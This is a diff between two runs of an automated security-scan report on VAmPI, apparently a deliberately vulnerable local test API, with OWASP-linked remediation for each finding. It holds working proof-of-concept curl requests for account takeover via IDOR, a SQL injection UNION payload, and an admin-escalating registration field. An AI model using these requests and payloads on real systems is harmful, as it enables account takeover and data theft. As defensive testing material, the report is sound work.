@@ -1,8 +1,8 @@
 {
-  "report_id": "VAMPI-20260810-212937-218F31",
+  "report_id": "VAMPI-20260812-183930-A9A4FA",
   "target_url": "http://localhost:5000",
-  "scan_started_at": "2026-08-10T21:29:37.728196Z",
-  "scan_completed_at": "2026-08-10T21:30:13.257026Z",
+  "scan_started_at": "2026-08-12T18:39:30.466652Z",
+  "scan_completed_at": "2026-08-12T18:40:17.607399Z",
   "scanner_version": "2.0.0",
   "phase": "Phase 2 — Security Testing",
   "catalog_source": "http://localhost:5000",
@@ -56,7 +56,7 @@
           "url": "http://localhost:5000/users/v1/login",
           "request_headers": {},
           "request_body": {
-            "username": "nonexistent_01df47",
+            "username": "nonexistent_961c0b",
             "password": "x"
           },
           "response_status": 200,
@@ -68,7 +68,7 @@
           "elapsed_ms": 0.0
         }
       ],
-      "proof_of_concept": "curl -X POST http://localhost:5000/users/v1/login \\\n  -d '{\"username\":\"nonexistent_01df47\",\"password\":\"x\"}'\n# Response reveals: user does not exist",
+      "proof_of_concept": "curl -X POST http://localhost:5000/users/v1/login \\\n  -d '{\"username\":\"nonexistent_961c0b\",\"password\":\"x\"}'\n# Response reveals: user does not exist",
       "remediation": [
         "Return a generic error message for all failed login attempts.",
         "Use the same response for wrong username and wrong password.",
@@ -78,7 +78,7 @@
         "https://owasp.org/API-Security/editions/2019/en/0xa2-broken-user-authentication/",
         "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
       ],
-      "discovered_at": "2026-08-10T21:29:40.640646Z"
+      "discovered_at": "2026-08-12T18:39:34.423115Z"
     },
     {
       "vuln_id": "BOLA-001",
@@ -93,12 +93,12 @@
       },
       "status": "VULNERABLE",
       "confirmed": true,
-      "description": "User 'bola_a_389cfd' (authenticated with their own JWT) successfully accessed User 'bola_b_389cfd's profile data by simply changing the username in the URL. The API does not verify that the requesting user owns the resource.",
+      "description": "User 'bola_a_2ffba4' (authenticated with their own JWT) successfully accessed User 'bola_b_2ffba4's profile data by simply changing the username in the URL. The API does not verify that the requesting user owns the resource.",
       "impact": "Any authenticated user can read any other user's profile data, including potentially sensitive fields like email addresses and admin flags.",
       "evidence": [
         {
           "method": "GET",
-          "url": "http://localhost:5000/users/v1/bola_b_389cfd",
+          "url": "http://localhost:5000/users/v1/bola_b_2ffba4",
           "request_headers": {
             "Authorization": "Bearer <User_A_JWT>"
           },
@@ -106,13 +106,13 @@
           "response_status": 200,
           "response_headers": {},
           "response_body": {
-            "username": "bola_b_389cfd",
-            "email": "b_389cfd@test.invalid"
+            "username": "bola_b_2ffba4",
+            "email": "b_2ffba4@test.invalid"
           },
           "elapsed_ms": 0.0
         }
       ],
-      "proof_of_concept": "# Login as User A to get JWT\ncurl -X POST http://localhost:5000/users/v1/login -d '{\"username\":\"bola_a_389cfd\",\"password\":\"...\"}'\n\n# Use User A's JWT to access User B's data\ncurl -H 'Authorization: Bearer <JWT_A>' http://localhost:5000/users/v1/bola_b_389cfd",
+      "proof_of_concept": "# Login as User A to get JWT\ncurl -X POST http://localhost:5000/users/v1/login -d '{\"username\":\"bola_a_2ffba4\",\"password\":\"...\"}'\n\n# Use User A's JWT to access User B's data\ncurl -H 'Authorization: Bearer <JWT_A>' http://localhost:5000/users/v1/bola_b_2ffba4",
       "remediation": [
         "Verify that the authenticated user ID matches the requested resource owner ID.",
         "Use the JWT sub/username claim to authorise resource access, not the URL parameter.",
@@ -122,7 +122,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
       ],
-      "discovered_at": "2026-08-10T21:29:42.082750Z"
+      "discovered_at": "2026-08-12T18:39:36.339271Z"
     },
     {
       "vuln_id": "BOLA-002",
@@ -137,17 +137,17 @@
       },
       "status": "VULNERABLE",
       "confirmed": true,
-      "description": "User 'bola_a_389cfd' successfully updated User 'bola_b_389cfd's email to 'hacked_62b257@evil.invalid'. This is an Insecure Direct Object Reference (IDOR) vulnerability.",
+      "description": "User 'bola_a_2ffba4' successfully updated User 'bola_b_2ffba4's email to 'hacked_59e092@evil.invalid'. This is an Insecure Direct Object Reference (IDOR) vulnerability.",
       "impact": "Account takeover: attacker changes victim's email and requests password reset.",
       "evidence": [
         {
           "method": "PUT",
-          "url": "http://localhost:5000/users/v1/bola_b_389cfd/email",
+          "url": "http://localhost:5000/users/v1/bola_b_2ffba4/email",
           "request_headers": {
             "Authorization": "Bearer <User_A_JWT>"
           },
           "request_body": {
-            "email": "hacked_62b257@evil.invalid"
+            "email": "hacked_59e092@evil.invalid"
           },
           "response_status": 204,
           "response_headers": {},
@@ -155,7 +155,7 @@
           "elapsed_ms": 0.0
         }
       ],
-      "proof_of_concept": "curl -X PUT -H 'Authorization: Bearer <JWT_A>' -H 'Content-Type: application/json' -d '{\"email\":\"attacker@evil.com\"}' http://localhost:5000/users/v1/bola_b_389cfd/email",
+      "proof_of_concept": "curl -X PUT -H 'Authorization: Bearer <JWT_A>' -H 'Content-Type: application/json' -d '{\"email\":\"attacker@evil.com\"}' http://localhost:5000/users/v1/bola_b_2ffba4/email",
       "remediation": [
         "Extract username from the validated JWT token, not the URL.",
         "Verify the JWT subject matches the URL username before processing.",
@@ -164,7 +164,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
       ],
-      "discovered_at": "2026-08-10T21:29:42.656076Z"
+      "discovered_at": "2026-08-12T18:39:37.215670Z"
     },
     {
       "vuln_id": "BOLA-003",
@@ -179,12 +179,12 @@
       },
       "status": "VULNERABLE",
       "confirmed": true,
-      "description": "User 'bola_a_389cfd' successfully changed User 'bola_b_389cfd's password without knowing the current password.",
+      "description": "User 'bola_a_2ffba4' successfully changed User 'bola_b_2ffba4's password without knowing the current password.",
       "impact": "Complete account takeover — attacker locks victim out of their account.",
       "evidence": [
         {
           "method": "PUT",
-          "url": "http://localhost:5000/users/v1/bola_b_389cfd/password",
+          "url": "http://localhost:5000/users/v1/bola_b_2ffba4/password",
           "request_headers": {
             "Authorization": "Bearer <User_A_JWT>"
           },
@@ -197,7 +197,7 @@
           "elapsed_ms": 0.0
         }
       ],
-      "proof_of_concept": "curl -X PUT -H 'Authorization: Bearer <JWT_A>' -H 'Content-Type: application/json' -d '{\"password\":\"hacker_new_pass\"}' http://localhost:5000/users/v1/bola_b_389cfd/password",
+      "proof_of_concept": "curl -X PUT -H 'Authorization: Bearer <JWT_A>' -H 'Content-Type: application/json' -d '{\"password\":\"hacker_new_pass\"}' http://localhost:5000/users/v1/bola_b_2ffba4/password",
       "remediation": [
         "Only allow users to change their own password (verify JWT subject == URL username).",
         "Require current password confirmation before allowing password change.",
@@ -206,7 +206,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
       ],
-      "discovered_at": "2026-08-10T21:29:42.940266Z"
+      "discovered_at": "2026-08-12T18:39:37.668853Z"
     },
     {
       "vuln_id": "BOLA-004",
@@ -246,16 +246,16 @@
                 "username": "admin"
               },
               {
-                "email": "sectest_35d70450@sectest.invalid",
-                "username": "sectest_35d70450"
+                "email": "sectest_32988f90@sectest.invalid",
+                "username": "sectest_32988f90"
               },
               {
-                "email": "hacked_62b257@evil.invalid",
-                "username": "bola_a_389cfd"
+                "email": "hacked_59e092@evil.invalid",
+                "username": "bola_a_2ffba4"
               },
               {
-                "email": "b_389cfd@test.invalid",
-                "username": "bola_b_389cfd"
+                "email": "b_2ffba4@test.invalid",
+                "username": "bola_b_2ffba4"
               }
             ]
           },
@@ -271,7 +271,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
       ],
-      "discovered_at": "2026-08-10T21:29:43.216013Z"
+      "discovered_at": "2026-08-12T18:39:38.067372Z"
     },
     {
       "vuln_id": "INJ-001",
@@ -291,7 +291,7 @@
       "evidence": [
         {
           "method": "PUT",
-          "url": "http://localhost:5000/users/v1/inj_feaef731/email",
+          "url": "http://localhost:5000/users/v1/inj_1f2b968c/email",
           "request_headers": {
             "Authorization": "Bearer <JWT>"
           },
@@ -304,11 +304,11 @@
             "status": "fail",
             "message": "Please Provide a valid email address."
           },
-          "elapsed_ms": 281.0
+          "elapsed_ms": 422.0
         },
         {
           "method": "PUT",
-          "url": "http://localhost:5000/users/v1/inj_feaef731/email",
+          "url": "http://localhost:5000/users/v1/inj_1f2b968c/email",
           "request_headers": {
             "Authorization": "Bearer <JWT>"
           },
@@ -321,11 +321,11 @@
             "status": "fail",
             "message": "Please Provide a valid email address."
           },
-          "elapsed_ms": 281.0
+          "elapsed_ms": 391.0
         },
         {
           "method": "PUT",
-          "url": "http://localhost:5000/users/v1/inj_feaef731/email",
+          "url": "http://localhost:5000/users/v1/inj_1f2b968c/email",
           "request_headers": {
             "Authorization": "Bearer <JWT>"
           },
@@ -338,10 +338,10 @@
             "status": "fail",
             "message": "Please Provide a valid email address."
           },
-          "elapsed_ms": 281.0
+          "elapsed_ms": 422.0
         }
       ],
-      "proof_of_concept": "curl -X PUT http://localhost:5000/users/v1/inj_feaef731/email \\\n  -H 'Authorization: Bearer <JWT>' \\\n  -d '{\"email\":\"' UNION SELECT username,password,1 FROM users--@x.com\"}'",
+      "proof_of_concept": "curl -X PUT http://localhost:5000/users/v1/inj_1f2b968c/email \\\n  -H 'Authorization: Bearer <JWT>' \\\n  -d '{\"email\":\"' UNION SELECT username,password,1 FROM users--@x.com\"}'",
       "remediation": [
         "Use parameterised queries for all database interactions.",
         "Validate and sanitise email format before query execution."
@@ -349,7 +349,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa8-injection/"
       ],
-      "discovered_at": "2026-08-10T21:29:46.012859Z"
+      "discovered_at": "2026-08-12T18:39:41.919881Z"
     },
     {
       "vuln_id": "EXPO-001",
@@ -396,27 +396,27 @@
               },
               {
                 "admin": false,
-                "email": "sectest_35d70450@sectest.invalid",
+                "email": "sectest_32988f90@sectest.invalid",
                 "password": "SecTest@2024!",
-                "username": "sectest_35d70450"
+                "username": "sectest_32988f90"
               },
               {
                 "admin": false,
-                "email": "hacked_62b257@evil.invalid",
+                "email": "hacked_59e092@evil.invalid",
                 "password": "TestPass@1",
-                "username": "bola_a_389cfd"
+                "username": "bola_a_2ffba4"
               },
               {
                 "admin": false,
-                "email": "b_389cfd@test.invalid",
+                "email": "b_2ffba4@test.invalid",
                 "password": "hacked_password_123",
-                "username": "bola_b_389cfd"
+                "username": "bola_b_2ffba4"
               },
               {
                 "admin": false,
-                "email": "inj_feaef731@test.invalid",
+                "email": "inj_1f2b968c@test.invalid",
                 "password": "InjTest@2024!",
-                "username": "inj_feaef731"
+                "username": "inj_1f2b968c"
               },
               {
                 "admin": false,
@@ -428,13 +428,13 @@
                 "admin": false,
                 "email": "t' OR '1'='1@test.invalid",
                 "password": "TestPass@1",
-                "username": "sqlitest_8941d0"
+                "username": "sqlitest_913ebc"
               },
               {
                 "admin": false,
-                "email": "exp_2fb508ca@test.invalid",
+                "email": "exp_c0423017@test.invalid",
                 "password": "ExpTest@2024!",
-                "username": "exp_2fb508ca"
+                "username": "exp_c0423017"
               }
             ]
           },
@@ -451,7 +451,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/"
       ],
-      "discovered_at": "2026-08-10T21:29:50.191823Z"
+      "discovered_at": "2026-08-12T18:39:47.482719Z"
     },
     {
       "vuln_id": "EXPO-002",
@@ -477,7 +477,7 @@
           "response_status": 200,
           "response_headers": {
             "server": "Werkzeug/2.2.3 Python/3.11.15",
-            "date": "Mon, 10 Aug 2026 21:29:50 GMT",
+            "date": "Wed, 12 Aug 2026 18:39:47 GMT",
             "content-type": "application/json",
             "content-length": "875",
             "connection": "close"
@@ -494,7 +494,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/"
       ],
-      "discovered_at": "2026-08-10T21:29:50.461952Z"
+      "discovered_at": "2026-08-12T18:39:47.840491Z"
     },
     {
       "vuln_id": "MASS-001",
@@ -509,7 +509,7 @@
       },
       "status": "VULNERABLE",
       "confirmed": true,
-      "description": "The registration endpoint accepted the extra field(s) {\"admin\": true} and applied them to the user's account. The user 'mass_8877f51c' was registered with admin privileges by including {\"admin\": true} in the registration payload.",
+      "description": "The registration endpoint accepted the extra field(s) {\"admin\": true} and applied them to the user's account. The user 'mass_105e0f2b' was registered with admin privileges by including {\"admin\": true} in the registration payload.",
       "impact": "Any unauthenticated user can self-register as an administrator, gaining full administrative access to the application.",
       "evidence": [
         {
@@ -517,9 +517,9 @@
           "url": "http://localhost:5000/users/v1/register",
           "request_headers": {},
           "request_body": {
-            "username": "mass_8877f51c",
+            "username": "mass_105e0f2b",
             "password": "***",
-            "email": "mass_8877f51c@test.invalid",
+            "email": "mass_105e0f2b@test.invalid",
             "admin": true
           },
           "response_status": 200,
@@ -542,8 +542,8 @@
           "response_body": {
             "data": {
               "admin": true,
-              "email": "mass_8877f51c@test.invalid",
-              "username": "mass_8877f51c"
+              "email": "mass_105e0f2b@test.invalid",
+              "username": "mass_105e0f2b"
             },
             "status": "success"
           },
@@ -561,7 +561,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/"
       ],
-      "discovered_at": "2026-08-10T21:29:51.949470Z"
+      "discovered_at": "2026-08-12T18:39:49.761139Z"
     },
     {
       "vuln_id": "RATE-001",
@@ -589,7 +589,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/"
       ],
-      "discovered_at": "2026-08-10T21:30:04.038300Z"
+      "discovered_at": "2026-08-12T18:40:05.148405Z"
     },
     {
       "vuln_id": "RATE-002",
@@ -616,7 +616,7 @@
       "references": [
         "https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/"
       ],
-      "discovered_at": "2026-08-10T21:30:13.256681Z"
+      "discovered_at": "2026-08-12T18:40:17.606800Z"
     }
   ],
   "endpoint_results": [],
